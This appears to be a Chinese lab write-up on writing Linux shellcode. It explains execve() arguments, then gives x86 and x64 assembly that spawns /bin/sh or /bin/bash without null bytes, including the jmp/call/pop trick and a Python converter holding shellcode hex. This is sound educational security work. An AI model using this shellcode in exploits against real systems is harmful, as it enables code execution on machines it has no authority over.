# execve()函数的参数含义

其函数原型通常如下：

```c
int execve(const char *pathname, char *const argv[], char *const envp[]);
```

### 参数一：`const char *pathname`

**作用：指定要执行的可执行文件的路径。**

这个参数是一个字符串，指向一个包含路径名的字符数组。它告诉内核：“请找到并加载这个路径下的文件来执行我。”

**详细解释：**

1. **路径类型**：

   *   **绝对路径**：例如 `"/usr/bin/ls"`。内核会直接根据这个路径去寻找文件。
   *   **相对路径**：例如 `"./my_program"`。内核会相对于当前进程的工作目录来解析这个路径。

2. **文件要求**：

   该文件必须是一个**真正的可执行文件**。这包括：

   * 由编译器生成的**二进制可执行文件**

   * 以 `#!interpreter [arg]` 开头的**脚本文件**（例如 Shell 脚本、Python 脚本）。在这种情况下，内核会启动 `#!` 后面指定的解释器，并将脚本路径和参数传递给解释器。例如，对于 `#!/bin/bash` 的脚本，实际执行的是 `/bin/bash your_script.sh`。

   * 当前进程必须对该文件拥有**执行权限**。

### 参数二：`char *const argv[]`

**作用：传递给新程序的命令行参数列表（Argument Vector）。**

这个参数是一个指针数组，其中每个指针指向一个以空字符结尾的字符串，最后以一个 `NULL` 指针结束。它模拟了我们在 Shell 中运行命令时输入的参数。

**详细解释：**

1. **格式约定**：

   *   `argv[0]`：按照约定，这通常是**所执行程序的名称**。它不一定必须与 `pathname` 完全一样，但通常是程序名（如 `"ls"`, `"grep"`）。很多程序的行为会依赖于 `argv[0]`，例如 `busybox` 通过检查 `argv[0]` 来决定以什么功能启动。
   *   `argv[1]`, `argv[2]`, ...：这些是传递给程序的真正参数。
   *   数组的最后一个元素**必须**是 `NULL` 指针。这对于内核和新程序知道参数列表在哪里结束至关重要。

2. **示例**：
   如果你想执行 `ls -l /home`，需要构建这样的数组：

   ```c
   char *argv[] = {
       "ls",    // argv[0]
       "-l",    // argv[1]
       "/home", // argv[2]
       NULL     // 结束标记
   };
   execve("/usr/bin/ls", argv, environ);
   ```

   在新程序（`/usr/bin/ls`）的 `main` 函数中，`argc` 将是 3，`argv[0]` 是 `"ls"`，`argv[1]` 是 `"-l"`，`argv[2]` 是 `"/home"`。

### 参数三：`char *const envp[]`

**作用：传递给新程序的环境变量列表（Environment Vector）。**

这个参数的结构与 `argv[]` 完全一样，也是一个以 `NULL` 结尾的字符串指针数组。每个字符串的格式通常是 `"KEY=VALUE"`。

**详细解释：**

1. **内容**：

   环境变量包含了系统的配置信息，如用户的主目录（`HOME`）、可执行文件的搜索路径（`PATH`）、当前使用的 Shell（`SHELL`）、语言设置（`LANG`）等。

2. **示例**：
   一个典型的环境数组可能看起来像这样：

   ```c
   char *envp[] = {
       "PATH=/usr/local/bin:/usr/bin:/bin",
       "HOME=/home/username",
       "USER=username",
       "TERM=xterm-256color",
       NULL // 结束标记
   };
   execve("./my_prog", argv, envp);
   ```

**注：第二个和第三个参数都是设置一个指针，这个指针指向的是字符串指针，即指针数组的形式**

# Task 1.a

`nasm`是一个针对`Intel x86`和`x64`架构的汇编器和反汇编器，`-f elf32`表示我们要将代码编译成32位ELF二进制格式

`ld`表示链接外部库，`elf_i386`表示生成32位可执行二进制文件

```shell
nasm -f elf32 mysh.s -o mysh.o
ld -m elf_i386 mysh.o -o mysh
```

![image-20251014152322610](https://raw.githubusercontent.com/Aur0r3-zy/picture/main/img/20251019210507507.png)

运行mysh，并查看正在执行的进程的pid

![image-20251014152727147](https://raw.githubusercontent.com/Aur0r3-zy/picture/main/img/20251019210507509.png)

发现正在运行的进程`pid`改变，证明这次执行产生了一个新的进程

**objdump** 命令可以用于反汇编可执行二进制文件，使用`-Mintel`选项表示在 Intel模式下生成汇编代码

```shell
objdump -Mintel --disassemble mysh.o
```

![image-20251014153026213](https://raw.githubusercontent.com/Aur0r3-zy/picture/main/img/20251019210507510.png)

**xxd** 是一个十六进制转储工具，可用于查看和修改二进制文件或数据的十六进制表示，-c 控制每行显示的字节数；-p 参数用于以纯粹的十六进制格式输出数据，而不包含行号、偏移量和ASCII 字符。使用` xxd `命令打印出二进制文件的内容，可以找到shellcode

`x80` 为机器代码的结束标识

![image-20251014153156626](https://raw.githubusercontent.com/Aur0r3-zy/picture/main/img/20251019210507511.png)

使用`convert.py`转换成`shellcode`

```python
#!/usr/bin/env python3

# Run "xxd -p -c 20 rev_sh.o",
# copy and paste the machine code to the following:
ori_sh ="""
31c050682f2f7368682f62696e89e3505389e131d231c0b00bcd80
"""

sh = ori_sh.replace("\n", "")

length  = int(len(sh)/2)
print("Length of the shellcode: {}".format(length))
s = 'shellcode= (\n' + '   "'
for i in range(length):
    s += "\\x" + sh[2*i] + sh[2*i+1]
    if i > 0 and i % 16 == 15: 
       s += '"\n' + '   "'
s += '"\n' + ").encode('latin-1')"
print(s)
```

![image-20251014154547724](https://raw.githubusercontent.com/Aur0r3-zy/picture/main/img/20251019210507512.png)

# Task 1.b

```assembly
section .text
  global _start
    _start:
      ; Store the argument string on stack
      xor  eax, eax 
      
      mov ebx, "h###"
      shl ebx, 24
      shr ebx, 24
      push ebx
      push "/bas"
      push "/bin"
      mov ebx, esp

      ; Construct the argument array argv[]
      push eax          ; argv[1] = 0
      push ebx          ; argv[0] points "/bin//sh"
      mov  ecx, esp     ; Get the address of argv[]
   
      ; For environment variable 
      xor  edx, edx     ; No env variables 

      ; Invoke execve()
      xor  eax, eax     ; eax = 0x00000000
      mov   al, 0x0b    ; eax = 0x0000000b
      int 0x80

```

**解决方法：将ebx向左移24位，“###”被丢弃，再向右移24位，变为“h000”，凑够了位数，又在不引入0的情况下使用0作为字符串结束符。**

![image-20251014154354479](https://raw.githubusercontent.com/Aur0r3-zy/picture/main/img/20251019210507513.png)

可以看到没有`0`

![image-20251014154824304](https://raw.githubusercontent.com/Aur0r3-zy/picture/main/img/20251019210507514.png)

# Task 1.c

在mysh.s基础上进行修改,将字符串压入栈，再将它们的存储地址存入寄存器中,压入字符串存储地址，构造argv[]数组，再将argv[]数组地址存入ecx。

```assembly
section .text
  global _start
    _start:
      ; Store the argument string on stack
      xor  eax, eax 

      push eax          ; Use 0 to terminate the string
      push "//sh"
      push "/bin"
      mov  ebx, esp     ; Get the string address argv[0]

      push eax
      mov ecx, "-c##"
      shl ecx, 16
      shr ecx, 16
      push ecx
      mov ecx,esp    ; argv[1]

      push eax
      mov edx, "al##"
      shl edx, 16
      shr edx, 16
      push edx
      push "ls -"
      mov edx,esp  ; argv[2]

      ; Construct the argument array argv[]
      push eax          ; argv[3] = 0
      push edx          ; argv[2] points "ls -la"
      push ecx          ; argv[1] = -c
      push ebx          ; argv[0] = /bin//sh
      mov  ecx, esp     ; Get the address of argv[]
   
      ; For environment variable 
      xor  edx, edx     ; No env variables 

      ; Invoke execve()
      xor  eax, eax     ; eax = 0x00000000
      mov   al, 0x0b    ; eax = 0x0000000b
      int 0x80
```

![image-20251014160051243](https://raw.githubusercontent.com/Aur0r3-zy/picture/main/img/20251019210507515.png)

机器码中没有0

![image-20251014160132270](https://raw.githubusercontent.com/Aur0r3-zy/picture/main/img/20251019210507516.png)

# Task 1.d

首先将`“/usr/bin/env”`压入栈

`“cccc=1234”`不是4的倍数，以`4byte`分组后将多出来的`“4”`放入al中，再将`eax`压入栈，使字符串完整入栈，且结束符也入栈。

将`edx`置为0，压入栈，再将`eax`压入栈，此时`eax`指向`“cccc=123”`所存储的地址。在`eax`上加0xc，这时`eax`指向`“bbb=5678”`，压入`eax`，将`“bbb=5678”`的存储地址压入了栈中，压入`“aaa=1234”`的存储地址同理。

```assembly
section .text
  global _start
    _start:
      ; Store the argument string on stack
      xor  eax, eax 

      push eax          ; Use 0 to terminate the string
      push "/env"
      push "/bin"
      push "/usr"
      mov  ebx, esp     ; Get the string address argv[0]

      push eax
      push ebx
      mov ecx, esp

      push eax
      push "1234"
      push "aaa="

      push eax
      push "5678"
      push "bbb="

      mov al, "4"
      push eax
      push "=123"
      push "cccc"

      mov eax, esp

      ; For environment variable 
      xor  edx, edx     ; No env variables 
      push edx
      push eax
      add eax, 0xc
      push eax
      add eax, 0xc
      push eax
      mov edx, esp

      
      ; Invoke execve()
      xor  eax, eax     ; eax = 0x00000000
      mov   al, 0x0b    ; eax = 0x0000000b
      int 0x80

```

![image-20251014161710104](https://raw.githubusercontent.com/Aur0r3-zy/picture/main/img/20251019210507517.png)

查看机器码，没有0

![image-20251014161853938](https://raw.githubusercontent.com/Aur0r3-zy/picture/main/img/20251019210507518.png)

# Task 2

（1）**解释代码：**

```assembly
section .text  ; .text 段包含可执行代码
  global _start ; _start 是程序入口点
    _start:
       BITS 32 ; 指定这是 32 位代码, 使用 32 位寄存器和指令
       jmp short two ; 跳转到 two 标签
    one:
       pop ebx  ;从栈中弹出字符串地址到 EBX
       xor eax, eax ; 将 EAX 清零
       mov [ebx+7], al ; 将 AL 存储到 ebx+7 地址,这会将字符串中的 * 替换为 \0,/bin/sh\0AAAABBBB
       mov [ebx+8], ebx ; 将 EBX（指向 "/bin/sh" 的指针）存储到 ebx+8 地址,这设置了 argv[0] 参数
	   mov [ebx+12], eax ; 将 EAX（值为 0）存储到 ebx+12 地址,这设置了 argv 数组的结束标记 NULL
       lea ecx, [ebx+8] ; 将 ebx+8 的地址加载到 ECX,ECX 现在指向参数数组 argv
       xor edx, edx ;将 EDX 清零，这设置了环境变量数组 envp 为 NULL
       mov al, 0x0b ;al = 0x0b
       int 0x80 ;将 11（0x0b）移动到 AL,11 是 execve 的系统调用号
    two:
       call one ;将下一条指令的地址压入栈中（即字符串地址）,并跳转到one
       db '/bin/sh*AAAABBBB' ;
```

**为什么这能成功执行 `/bin/sh`**

**`ebx` 指向一个以 `\0` 终止的字符串 `"/bin/sh"`**（通过 `mov [ebx+7], al` 写入 `0` 实现）。内核读取 `ebx` 作为 `filename`，找到合法 C 字符串。

**`ecx` 指向一个以 NULL 结尾的指针数组**，第一个元素正好指向 `"/bin/sh"`。这就是 `argv`（`argv[0]` = `"/bin/sh"`, `argv[1]` = `NULL`）。

**`edx = NULL`** 表示 `envp = NULL`。

**`eax = 11` (`execve`)** 且 `int 0x80` 发起系统调用。内核使用这些参数执行 `execve(filename, argv, envp)`，因此 `/bin/sh` 被执行。

（2）默认情况下，代码段不可写的，所以，在运行链接器程序（ld）时，我们需要使用——omagic选项让代码段可写。

```shell
ld --omagic -m elf_i386 mysh2.o -o mysh2
```

```assembly
; myexec.s -- position-independent execve("/usr/bin/env", argv, envp)
; NASM (Intel) syntax, 32-bit

section .text                     ; 指定代码段 .text
global _start                     ; 导出 _start 作为入口点
bits 32                           ; 指定为 32 位代码

_start:
    jmp short two                 ; 跳转到 two 标签（数据区），为后面的 call/pop 技巧做准备

one:
    pop ebx                       ; 从栈中弹出地址到 ebx，ebx 现在指向 db 后的字符串缓冲区
    xor eax, eax                  ; 将 eax 清零（eax = 0），便于写入 0 或作为临时寄存器

    mov [ebx+0x0c], eax           ; 在 ebx+0x0c 写入 4 字节的 0（终止 "/usr/bin/env" 字符串）
    mov [ebx+0x10], ebx           ; 在 ebx+0x10 写入 ebx（argv[0] = 指向 filename 的指针）
    lea ecx, [ebx+0x10]           ; 将 ecx 设为 ebx+0x10（ecx 指向 argv 数组，execve 的第二个参数）

    mov [ebx+0x14], eax           ; 在 ebx+0x14 写入 0（argv[1] = NULL，argv 以 NULL 终止）

    mov [ebx+0x1d], al            ; 在 ebx+0x1d 写入单字节 0（终止第一个 env 字符串，例如把占位 '*' 变为 '\0'）
    mov [ebx+0x23], al            ; 在 ebx+0x23 写入单字节 0（终止第二个 env 字符串）

    lea eax, [ebx+0x18]           ; eax = ebx + 0x18（指向第一个环境字符串的起始）
    mov [ebx+0x24], eax           ; 在 ebx+0x24 写入 eax（envp[0] = 指向第一个 env 字符串的指针）

    lea eax, [ebx+0x1e]           ; eax = ebx + 0x1e（指向第二个环境字符串的起始）
    mov [ebx+0x28], eax           ; 在 ebx+0x28 写入 eax（envp[1] = 指向第二个 env 字符串的指针）

    xor eax, eax                  ; eax = 0（再次清零，用于写入 envp 的 NULL 终结）
    mov [ebx+0x2c], eax           ; 在 ebx+0x2c 写入 0（envp[2] = NULL，envp 数组以 NULL 终止）

    lea edx, [ebx+0x24]           ; edx = ebx + 0x24（edx 指向 envp 数组，execve 的第三个参数）
    mov al, 0x0b                  ; al = 0x0b（设置 eax = 11，sys_execve 的系统调用号）
    int 0x80                      ; 触发系统调用，内核执行 execve( filename=ebx, argv=ecx, envp=edx )

two:
    call one                      ; call one 会把下一条指令地址（即 db 的地址）压栈，然后跳到 one，配合 pop ebx 取得 db 地址
    db '/usr/bin/env****argv****aa=11*bb=22*env1env2****' ; 数据区：放置字符串和占位符，运行时会被就地修改为合法的 C 字符串和指针表

```

![image-20251014163718277](https://raw.githubusercontent.com/Aur0r3-zy/picture/main/img/20251019210507519.png)

# Task 3

对于x64体系结构，调用系统调用是通过系统调用指令完成的，系统调用的前三个参数分别存储在rdi、rsi、rdx寄存器中。

在64-bit shellcode中，以8字节为一组分割命令字符串，将字符串存入rax，再将rax压入栈。

```assembly
section .text
  global _start
_start:
      xor  rdx, rdx            ; 将 rdx 置 0，后面作为 execve 的 envp
      mov al, 'h'              ; 将字符 'h' 装入 al
      push rax                 ; 将 rax压入栈——目的是把 'h' 放在栈上作为字符串结尾的一部分
      mov rax, "/bin/bas"      ; 把 "/bin/bas" 的低 8 字节装到 rax

      push rax                 ; 将 "/bin/bas"压入栈；与上面的 'h' 组合后，栈上顺序变为 "/bin/bas" 接着 'h'，构成 "/bin/bash\0"
      mov rdi, rsp             ; 将 rdi 指向栈顶（filename 指针 -> 指向 "/bin/bash" 字符串）
      
      push rdx                 ; push NULL，作为 argv 的终止（argv[1] = NULL）
      push rdi                 ; push filename 指针，argv[0] = pointer to "/bin/bash"
      mov rsi, rsp             ; rsi = &argv
      
      xor rax, rax             ; 将 rax 清零
      mov al, 0x3b             ; al = 0x3b => rax = 59（sys_execve 的 syscall 编号）
      syscall                  ; 发起系统调用：execve(rdi (filename), rsi (argv), rdx (envp))
```

运行结果：

![image-20251014164701307](https://raw.githubusercontent.com/Aur0r3-zy/picture/main/img/20251019210507520.png)